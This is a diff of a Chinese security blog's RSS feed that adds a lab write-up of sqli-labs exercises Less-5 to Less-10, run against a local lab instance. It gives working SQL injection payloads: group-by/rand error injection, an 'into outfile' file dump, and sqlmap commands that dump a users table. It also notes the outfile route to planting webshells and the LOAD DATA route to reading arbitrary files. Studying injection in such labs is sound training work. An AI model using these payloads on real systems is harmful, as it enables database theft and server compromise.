@@ -1,4 +1,234 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>sqli on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/sqli/</link><description>Recent content in sqli on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Mon, 09 May 2022 17:14:46 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/sqli/index.xml" rel="self" type="application/rss+xml"/><item><title>sqli-labs 实验记录</title><link>https://nnnewb.github.io/blog/p/sqli-labs-traning-1/</link><pubDate>Mon, 09 May 2022 17:14:46 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/sqli-labs-traning-1/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>sqli on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/sqli/</link><description>Recent content in sqli on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Tue, 10 May 2022 15:14:45 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/sqli/index.xml" rel="self" type="application/rss+xml"/><item><title>sqli-labs 实验记录 #2</title><link>https://nnnewb.github.io/blog/p/sqli-labs-training-2/</link><pubDate>Tue, 10 May 2022 15:14:45 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/sqli-labs-training-2/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>开始 sqli-labs 的第二轮训练。&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>!!!ATTENTION!!!&lt;/strong>&lt;/p>
+&lt;p>在 MySQL 5.7.36 更新中，修复了 group by 报错 &lt;code>Duplicate entry '0' for key '&amp;lt;group_key&amp;gt;'&lt;/code> 的问题。&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;a class="link" href="https://dev.mysql.com/doc/relnotes/mysql/5.7/en/news-5-7-36.html" target="_blank" rel="noopener"
+>Changes in MySQL 5.7.36 (2021-10-19, General Availability)&lt;/a>&lt;/p>
+&lt;p>When a query uses a temporary table for aggregation, the group by item is used as a unique constraint on the temporary table: If the item value is already present, the row is updated; otherwise, a new row is inserted into the temporary table. If the item has a result field or reference item, it it evaluated twice, once to check whether the result exists in the temporary table and, if not, again while constructing the row to be inserted. When the group by item was nondeterministic, the result value used to check for existence differed from that with which an insert was attempted, causing the insert to be rejected if the value already existed in the table.&lt;/p>
+&lt;p>We fix this by using the hash of any nondeterministic items as the unique constraint, so that the hash is evaluated once only. (Bug #32552332)&lt;/p>
+&lt;/blockquote>
+&lt;p>使用的 MySQL 版本 &amp;gt;=5.7.36 时，Less 5 和 Less 6 使用的 &lt;code>select count(*), concat(version(), '~', floor(rand(14)*2)) x from user group by x;&lt;/code> 不会再报错。这个利用被彻底堵死了。&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="less-5-error-based-double-query">Less-5 Error-Based Double Query&lt;/h2>
+&lt;h3 id="原理">原理&lt;/h3>
+&lt;p>有一篇&lt;a class="link" href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/" target="_blank" rel="noopener"
+>很好的文章&lt;/a>解释了这里的 Double Injection 指的是什么。我尽量概括一下。&lt;/p>
+&lt;p>先忽略 &lt;em>Double Injection&lt;/em> 这个不明所以的名字，它代表技术原理的是利用 &lt;code>group by &amp;lt;col&amp;gt;&lt;/code> 产生临时表，&lt;code>col&lt;/code> 在临时表有唯一性约束，而 MySQL 在违反唯一性约束的错误信息里会提示违反唯一性的&lt;code>col&lt;/code>内容是什么，由此产生信息泄露。&lt;/p>
+&lt;p>以一个案例来解释。下面的查询里&lt;code>version()&lt;/code>是想爆的列，&lt;code>concat(...)&lt;/code>连接目标列和随机数序列构造一个尽可能快出现冲突的&lt;code>group key&lt;/code>。&lt;code>floor(rand(14)*2)&lt;/code>产生的序列前四个结果是&lt;code>1,0,1,0&lt;/code>，插入过程会产生两个&lt;code>rand&lt;/code>调用（一次检查是否存在，一次插入新行），所以可以看成第一次查询&lt;code>1&lt;/code>不存在，插入&lt;code>0&lt;/code>；第二次查询&lt;code>1&lt;/code>不存在，插入&lt;code>0&lt;/code>，报错违反唯一性约束。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">floor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>其中一个比较有趣的点是为什么要用&lt;code>rand&lt;/code>，能不能写一个固定值？&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="s1">&amp;#39;~&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;hello&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>不行，这样做等于&lt;code>group by&lt;/code>常量或者一个列，和普通&lt;code>group by&lt;/code>没区别。&lt;code>rand&lt;/code>发挥的关键作用是扰乱插入更新/插入临时表的过程。这个过程可以理解成这样：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nf">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">group_key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tally&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="nf">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">group_key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>不使用&lt;code>rand&lt;/code>时&lt;code>update&lt;/code>和&lt;code>insert&lt;/code>接收的就是同一个&lt;code>group_key&lt;/code>，使用&lt;code>rand&lt;/code>后&lt;code>update&lt;/code>和&lt;code>insert&lt;/code>就可能用的不是同一个&lt;code>group_key&lt;/code>了，导致进入&lt;code>insert&lt;/code>时插入的是已存在的&lt;code>group_key&lt;/code>。&lt;/p>
+&lt;p>另一个有趣的问题是为什么要有&lt;code>count(*)&lt;/code>？去掉&lt;code>count(*)&lt;/code>就会导致不再报错。&lt;/p>
+&lt;p>等大佬解释。&lt;/p>
+&lt;h3 id="题解">题解&lt;/h3>
+&lt;p>&lt;code>?id=1' union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510135044215.png"
+width="974"
+height="215"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510135044215_huefffb63b6882b93af83cdf945098e6c1_14004_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510135044215_huefffb63b6882b93af83cdf945098e6c1_14004_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510135044215"
+class="gallery-image"
+data-flex-grow="453"
+data-flex-basis="1087px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Attention：&lt;/strong> MySQL版本 &amp;gt;=5.7.36 这个解法彻底失效。目前搜索 Double Injection 只有这一个解，如果有别的思路务必告知我。&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="less-6-error-based-double-query">Less-6 Error-Based Double Query&lt;/h2>
+&lt;p>和 Less-5 的区别只在于从单引号换成了双引号。稍微改一改 payload：&lt;code>?id=1&amp;quot; union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510140208135.png"
+width="1107"
+height="326"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510140208135_hu3235d36ba755a563f151709800b5bf17_176469_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510140208135_hu3235d36ba755a563f151709800b5bf17_176469_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510140208135"
+class="gallery-image"
+data-flex-grow="339"
+data-flex-basis="814px"
+>&lt;/p>
+&lt;h2 id="less-7-dump-into-outfile">Less-7 Dump into Outfile&lt;/h2>
+&lt;blockquote>
+&lt;p>**注意：**这题不要求 Error-Based 了，请注意。&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="原理-1">原理&lt;/h3>
+&lt;p>简而言之，两个方面：&lt;/p>
+&lt;ol>
+&lt;li>利用 MySQL 的 &lt;code>select ... into outfile|dumpfile &amp;lt;filepath&amp;gt;&lt;/code> 语法把查询结果保存到文件。&lt;/li>
+&lt;li>利用 MySQL 的 &lt;code>LOAD DATA&lt;/code> 和 &lt;code>LOAD XML&lt;/code> 语句读出任意文件内容。&lt;/li>
+&lt;/ol>
+&lt;p>第一点可以用作覆盖磁盘上任意文件，通过 SQL 注入实现写入 webshell 或 crontab 等恶意行为。&lt;/p>
+&lt;p>第二点可以从 SQL 注入扩展到任意文件读取，MySQL 权限足够情况下可以拿到很多敏感文件内容。&lt;/p>
+&lt;h3 id="题解-1">题解&lt;/h3>
+&lt;p>本题没有回显，虽然可以按盲注爆破，但题目提示是使用 &lt;code>outfile&lt;/code>。所以最简单的解法就是两步走。&lt;/p>
+&lt;ol>
+&lt;li>注入 &lt;code>SELECT ... INTO DUMPFILE&lt;/code> 导出结果到文件。&lt;/li>
+&lt;li>注入 &lt;code>LOAD DATA&lt;/code> 进而拿到结果。&lt;/li>
+&lt;/ol>
+&lt;p>先确认注入类型：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>?id=1 and 1=0;--%20&lt;/code> 无效&lt;/li>
+&lt;li>&lt;code>?id=1' and 1=0;--%20&lt;/code> 报错&lt;/li>
+&lt;li>&lt;code>?id=1&amp;quot; and 1=0;--%20&lt;/code> 无效&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142759400.png"
+width="1106"
+height="320"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142759400_hu90d926b5d54057f8970fc3576c37f315_170496_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142759400_hu90d926b5d54057f8970fc3576c37f315_170496_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510142759400"
+class="gallery-image"
+data-flex-grow="345"
+data-flex-basis="829px"
+>&lt;/p>
+&lt;p>所以是字符型注入，但SQL语句未知，尝试补括号：&lt;code>?id=1') and 1=1;--%20&lt;/code>，依然报错，补两个括号后发现变正常：&lt;code>?id=1')) and 1=1;--%20&lt;/code>。完成注入类型确认。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142812936.png"
+width="1100"
+height="337"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142812936_hu533210a05faa9fed51aaf9b592243e88_170433_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510142812936_hu533210a05faa9fed51aaf9b592243e88_170433_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510142812936"
+class="gallery-image"
+data-flex-grow="326"
+data-flex-basis="783px"
+>&lt;/p>
+&lt;p>接着把&lt;code>and&lt;/code>条件去掉，改成&lt;code>into outfile '/var/www/html/dump.txt'&lt;/code>，完整 payload：&lt;code>?id=1')) into outfile '/var/www/html/dump.txt';--%20&lt;/code>&lt;/p>
+&lt;blockquote>
+&lt;p>**注意：**docker方式部署请注意，MySQL 镜像默认启用了 &lt;code>--secure-file-priv&lt;/code> 选项，这个选项会禁用 &lt;code>select .. into outfile|dumpfile&lt;/code>，使注入的SQL执行失败。&lt;/p>
+&lt;p>**注意：**docker-compose 方式部署的 sqli-labs 如果把 MySQL 和 PHP+Apache 分开部署，即使&lt;code>select ... into outfile ...&lt;/code> 成功，也无法直接通过 HTTP 方式下载，这一利用也无法继续下去。&lt;/p>
+&lt;/blockquote>
+&lt;p>上述注入如果成功的话可以直接访问 &lt;code>http://localhost:8080/dump.txt&lt;/code> 下载到查询结果了。&lt;/p>
+&lt;h2 id="less-8-blind-boolian">Less-8 Blind Boolian&lt;/h2>
+&lt;p>题目是布尔盲注。确认 SQL 注入类型：&lt;code>?id=1' and 1=1;--%20&lt;/code>。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510144442127.png"
+width="1135"
+height="335"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510144442127_hubb7b3bb8e10f6c5b3b4cc27acdc84c09_176762_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510144442127_hubb7b3bb8e10f6c5b3b4cc27acdc84c09_176762_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510144442127"
+class="gallery-image"
+data-flex-grow="338"
+data-flex-basis="813px"
+>&lt;/p>
+&lt;p>典型的盲注，不自己动手了，接下来直接上 sqlmap。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/Less-8/?id=1&amp;#39;&lt;/span> --technique B -p id -T users --dump
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">Database: security
+Table: users
+[13 entries]
++------+----------+------------+
+| id | username | password |
++------+----------+------------+
+| 1 | Dumb | Dumb |
+| 2 | Angelina | I-kill-you |
+| 3 | Dummy | p@ssword |
+| 4 | secure | crappy |
+| 5 | stupid | stupidity |
+| 6 | superman | genious |
+| 7 | batman | mob!le |
+| 8 | admin | admin |
+| 9 | admin1 | admin1 |
+| 10 | admin2 | admin2 |
+| 11 | admin3 | admin3 |
+| 12 | dhakkan | dumbo |
+| 14 | admin4 | admin4 |
++------+----------+------------+
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>done。&lt;/p>
+&lt;h2 id="less-9-blind-time-based">Less-9 Blind Time-Based&lt;/h2>
+&lt;p>基于时间的盲注，先测试注入类型：&lt;code>?id=1' and sleep(1);--%20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510145029175.png"
+width="415"
+height="322"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510145029175_hu1ff0051e63321d97d122d24466263499_14007_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-2/image-20220510145029175_hu1ff0051e63321d97d122d24466263499_14007_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220510145029175"
+class="gallery-image"
+data-flex-grow="128"
+data-flex-basis="309px"
+>&lt;/p>
+&lt;p>确认注入类型成功。接着还是上 sqlmap。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/Less-9/?id=1&amp;#39;&lt;/span> --technique T -p id -T users --dump --count &lt;span class="m">1&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>基于时间的盲注非常慢，即使 sqlmap 做了优化，依然非常慢，所以只提取一行。我懒得等就直接 ctrl+c 了。总之，就到这里结束。&lt;/p>
+&lt;h2 id="less-10-blind-time-based-doublequotes">Less-10 Blind Time-Based DoubleQuotes&lt;/h2>
+&lt;p>和 Less-9 一样，换成了双引号。&lt;code>sqlmap&lt;/code>需要加上&lt;code>--level 2&lt;/code>参数，让 &lt;code>sqlmap&lt;/code> 更努力一点。&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>两个知识点一个教训。&lt;/p>
+&lt;p>知识点：&lt;/p>
+&lt;ol>
+&lt;li>&lt;code>rand&lt;/code>结合&lt;code>group by&lt;/code>实现报错注入，不过遗憾的是 MySQL 5.7.36 修复了，将来这个技巧算废了。&lt;/li>
+&lt;li>&lt;code>select ... into outfile|dumpfile&lt;/code>和&lt;code>load data&lt;/code>。对MySQL和php分开部署的情况能导出不能下载，MySQL容器默认禁止了文件权限，无法利用。&lt;/li>
+&lt;/ol>
+&lt;p>教训则是接受失败和耐心尝试。尝试 Less-7 的时候，因为多出来的两个右括号，第一次补右括号无效后我差点就放弃尝试直接去看源码了。后来不抱什么希望再补了一个右括号，发现成功了的时候真的很惊喜，甚至有点庆幸。这也算是一次对自己的惰性的胜利吧。&lt;/p>
+&lt;p>虽然啥也没干还是辛苦我自己了。&lt;/p></description></item><item><title>sqli-labs 实验记录 #1</title><link>https://nnnewb.github.io/blog/p/sqli-labs-training-1/</link><pubDate>Mon, 09 May 2022 17:14:46 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/sqli-labs-training-1/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
 &lt;p>sqli-labs 是一个开源的 SQL 注入学习平台，最近更新已经是 2014 年了，也是个老项目。不过 sqli-labs 提供的靶场更大，包含 4 个难度级别，每个难度十几题，总共 65 题。&lt;/p>
 &lt;p>感觉会比 dvwa 难一大截，用来学 SQL 注入的玩法肯定是绰绰有余了。&lt;/p>
 &lt;p>本篇应该是 sqli-labs &lt;em>Basic Challenges&lt;/em> 系列 WP 的开始。&lt;/p>
@@ -27,10 +257,10 @@ docker-compose up -d
 &lt;p>之所以说没必要是可能影响之后的注入利用，总之这一步随意。&lt;/p>
 &lt;h2 id="初探">初探&lt;/h2>
 &lt;h3 id="总览">总览&lt;/h3>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509155939222.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509155939222.png"
 width="1920"
 height="935"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509155939222_huf633b8b6263f38e2990a8cfbe67df6df_78039_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509155939222_huf633b8b6263f38e2990a8cfbe67df6df_78039_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509155939222_huf633b8b6263f38e2990a8cfbe67df6df_78039_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509155939222_huf633b8b6263f38e2990a8cfbe67df6df_78039_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509155939222"
 class="gallery-image"
@@ -41,10 +271,10 @@ data-flex-basis="492px"
 &lt;p>下面的脑图就是这个难度下的 &lt;em>关卡&lt;/em> 了。&lt;/p>
 &lt;h3 id="less-1-error-based-string">Less-1 Error-Based string&lt;/h3>
 &lt;p>随意打开第一题。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509162045531.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162045531.png"
 width="1065"
 height="293"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509162045531_hu928e31b5621b2b11be7bb8c4b66a2c48_98253_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509162045531_hu928e31b5621b2b11be7bb8c4b66a2c48_98253_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162045531_hu928e31b5621b2b11be7bb8c4b66a2c48_98253_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162045531_hu928e31b5621b2b11be7bb8c4b66a2c48_98253_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509162045531"
 class="gallery-image"
@@ -52,10 +282,10 @@ data-flex-grow="363"
 data-flex-basis="872px"
 >&lt;/p>
 &lt;p>提示输入数字ID作为参数，提示有点模糊，正确做法是在URL里添加&lt;code>?id=1&lt;/code>这样的 query string。上一页有明确提示 &lt;code>single quotes&lt;/code>，这里给一个&lt;code>'&lt;/code>就会报错：&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509162320625.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162320625.png"
 width="1245"
 height="248"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509162320625_hu92f3ed23e0f69e0380dab9a75fb011b4_103092_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509162320625_hu92f3ed23e0f69e0380dab9a75fb011b4_103092_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162320625_hu92f3ed23e0f69e0380dab9a75fb011b4_103092_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162320625_hu92f3ed23e0f69e0380dab9a75fb011b4_103092_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509162320625"
 class="gallery-image"
@@ -63,10 +293,10 @@ data-flex-grow="502"
 data-flex-basis="1204px"
 >&lt;/p>
 &lt;p>但奇妙的是这里看似是数字型注入，给&lt;code>?id=1 and 1=1&lt;/code>正确返回。但如果多测一下&lt;code>?id=1 and 1=0&lt;/code>就会发现依然是正确返回，所以造成这一结果应该是 php 5.x 的字符串转数字中丢掉了后面的&lt;code>and 1=1&lt;/code>。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509162647659.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162647659.png"
 width="512"
 height="547"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509162647659_hubd5c3a13e32af9ed107d20cccbe656ac_25084_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509162647659_hubd5c3a13e32af9ed107d20cccbe656ac_25084_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162647659_hubd5c3a13e32af9ed107d20cccbe656ac_25084_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162647659_hubd5c3a13e32af9ed107d20cccbe656ac_25084_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509162647659"
 class="gallery-image"
@@ -74,10 +304,10 @@ data-flex-grow="93"
 data-flex-basis="224px"
 >&lt;/p>
 &lt;p>所以按字符型注入处理即可。确定要补&lt;code>'&lt;/code>之后就可以继续了。这题主题是 Error Based，所以我们构造一个 Error Based 注入。&lt;code>?id=1' and extractvalue(1,concat('~',version())) -- &lt;/code>。注意&lt;code>--&lt;/code>后的空格，浏览器会自动删掉URL前后的空格字符，可以手动在末尾补一个URL编码的空格符&lt;code>%20&lt;/code>。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163203656.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163203656.png"
 width="1083"
 height="249"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163203656_hudf1f1a1ed6aef57603fc90799f4fe80d_97515_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163203656_hudf1f1a1ed6aef57603fc90799f4fe80d_97515_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163203656_hudf1f1a1ed6aef57603fc90799f4fe80d_97515_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163203656_hudf1f1a1ed6aef57603fc90799f4fe80d_97515_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509163203656"
 class="gallery-image"
@@ -87,10 +317,10 @@ data-flex-basis="1043px"
